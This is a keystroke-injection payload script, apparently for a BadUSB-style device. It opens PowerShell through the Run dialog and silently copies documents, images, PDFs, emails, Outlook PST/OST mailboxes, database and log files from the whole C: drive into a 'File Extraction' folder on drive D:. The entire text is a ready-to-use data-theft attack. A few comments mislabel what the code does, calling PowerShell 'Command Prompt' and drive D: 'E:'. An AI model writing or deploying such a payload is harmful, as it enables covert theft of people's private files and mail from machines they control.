layout('us') // Set keyboard layout to US
press("GUI r") // Press Windows + R to open the Run dialog
delay(100)
type("powershell\n") // Open Command Prompt
delay(500)
type("D:\n") // Change to the E: drive
delay(100)
type("$usBPath = 'D:\\File Extraction';\n")
delay(500)
type("if (-Not (Test-Path $usBPath)) { New-Item -Path $usBPath -ItemType Directory }\n")
delay(500)
type("$filetypes = @('jpg', 'png', 'txt', 'docx', 'xlsx', 'pdf', 'html', 'eml', 'pst', 'ost', 'db', 'log');\n")
delay(500)
type("foreach ($type in $filetypes) {\n")
delay(500)
type("Get-ChildItem -Path C:\\ -Recurse -Filter \"*.$type\" -ErrorAction SilentlyContinue | \n")
delay(500)
type("Copy-Item -Destination $usBPath -Force\n")
delay(500)
type("}\n")
delay(500)
type("exit\n")
